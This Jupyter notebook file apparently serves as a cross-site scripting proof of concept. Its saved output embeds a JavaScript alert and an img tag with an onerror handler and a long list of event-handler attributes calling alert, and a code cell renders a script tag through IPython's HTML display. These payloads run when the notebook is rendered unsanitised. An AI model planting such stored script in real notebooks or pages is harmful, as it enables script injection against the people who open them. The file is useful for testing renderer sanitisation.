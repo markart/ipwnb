{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "outputs": [
    {
     "data": {
      "application/javascript": [
       "alert(123)"
      ],
      "text/html": [
       "<h1>lol</h1><img src=sadsd onerror=javascript:alert(123)
       afterscriptexecute=alert(/afterscriptexecute/)
       beforescriptexecute=alert(/beforescriptexecute/)
       beforeinstallprompt=alert(/beforeinstallprompt/)
       cardstatechange=alert(/cardstatechange/)
       change=alert(/change/)
       connectionInfoUpdate=alert(/connectionInfoUpdate/)
       cfstatechange=alert(/cfstatechange/)
       datachange=alert(/datachange/)
       dataerror=alert(/dataerror/)
       DOMMouseScroll=alert(/DOMMouseScroll/)
       dragdrop=alert(/dragdrop/)
       dragexit=alert(/dragexit/)
       draggesture=alert(/draggesture/)
       icccardlockerror=alert(/icccardlockerror/)
       iccinfochange=alert(/iccinfochange/)
       localized=alert(/localized/)
       mousewheel=alert(/mousewheel/)
       MozAudioAvailable=alert(/MozAudioAvailable/)
       MozBeforeResize=alert(/MozBeforeResize/)
       mozbrowseractivitydone=alert(/mozbrowseractivitydone/)
       mozbrowserasyncscroll=alert(/mozbrowserasyncscroll/)
       mozbrowseraudioplaybackchange=alert(/mozbrowseraudioplaybackchange/)
       mozbrowsercaretstatechanged=alert(/mozbrowsercaretstatechanged/)
       mozbrowserclose=alert(/mozbrowserclose/)
       mozbrowsercontextmenu=alert(/mozbrowsercontextmenu/)
       mozbrowserdocumentfirstpaint=alert(/mozbrowserdocumentfirstpaint/)
       mozbrowsererror=alert(/mozbrowsererror/)
       mozbrowserfindchange=alert(/mozbrowserfindchange/)
       mozbrowserfirstpaint=alert(/mozbrowserfirstpaint/)
       mozbrowsericonchange=alert(/mozbrowsericonchange/)
       mozbrowserlocationchange=alert(/mozbrowserlocationchange/)
       mozbrowserloadend=alert(/mozbrowserloadend/)
       mozbrowserloadstart=alert(/mozbrowserloadstart/)
       mozbrowsermanifestchange=alert(/mozbrowsermanifestchange/)
       mozbrowsermetachange=alert(/mozbrowsermetachange/)
       mozbrowseropensearch=alert(/mozbrowseropensearch/)
       mozbrowseropentab=alert(/mozbrowseropentab/)
       mozbrowseropenwindow=alert(/mozbrowseropenwindow/)
       mozbrowserresize=alert(/mozbrowserresize/)
       mozbrowserscroll=alert(/mozbrowserscroll/)
       mozbrowserscrollareachanged=alert(/mozbrowserscrollareachanged/)
       mozbrowserscrollviewchange=alert(/mozbrowserscrollviewchange/)
       mozbrowsersecuritychange=alert(/mozbrowsersecuritychange/)
       mozbrowserselectionstatechanged=alert(/mozbrowserselectionstatechanged/)
       mozbrowsershowmodalprompt=alert(/mozbrowsershowmodalprompt/)
       mozbrowsertitlechange=alert(/mozbrowsertitlechange/)
       mozbrowserusernameandpasswordrequired=alert(/mozbrowserusernameandpasswordrequired/)
       mozbrowservisibilitychange=alert(/mozbrowservisibilitychange/)
       MozGamepadButtonDown=alert(/MozGamepadButtonDown/)
       MozGamepadButtonUp=alert(/MozGamepadButtonUp/)
       MozMousePixelScroll=alert(/MozMousePixelScroll/)
       MozOrientation=alert(/MozOrientation/)
       MozScrolledAreaChanged=alert(/MozScrolledAreaChanged/)
       moztimechange=alert(/moztimechange/)
       MozTouchDown=alert(/MozTouchDown/)
       MozTouchMove=alert(/MozTouchMove/)
       MozTouchUp=alert(/MozTouchUp/)
       alerting=alert(/alerting/)
       busy=alert(/busy/)
       callschanged=alert(/callschanged/)
       onconnected=alert(/onconnected/)
       connecting=alert(/connecting/)
       delivered=alert(/delivered/)
       dialing=alert(/dialing/)
       disabled=alert(/disabled/)
       disconnected=alert(/disconnected/)
       disconnecting=alert(/disconnecting/)
       enabled=alert(/enabled/)
       error=alert(/error/)
       held=alert(/held/)
       holding=alert(/holding/)
       incoming=alert(/incoming/)
       received=alert(/received/)
       resuming=alert(/resuming/)
       sent=alert(/sent/)
       statechange=alert(/statechange/)
       statuschange=alert(/statuschange/)
       overflow=alert(/overflow/)
       smartcard-insert=alert(/smartcard-insert/)
       smartcard-remove=alert(/smartcard-remove/)
       stkcommand=alert(/stkcommand/)
       stksessionend=alert(/stksessionend/)
       text=alert(/text/)
       underflow=alert(/underflow/)
       uploadprogress=alert(/uploadprogress/)
       ussdreceived=alert(/ussdreceived/)
       voicechange=alert(/voicechange/)/>"
             ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "def html(blob):\n",
    "    \"\"\"\n",
    "        Ouput blob as HTML code inside the notebook (warning here) also\n",
    "        syntax highlighted\n",
    "        \n",
    "        :param blob: HTML to output\n",
    "    \"\"\"\n",
    "    from IPython.display import display, HTML\n",
    "    chart = HTML(blob)\n",
    "    display(chart)\n",
    "\n",
    "html('<script>alert(123)</script>')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
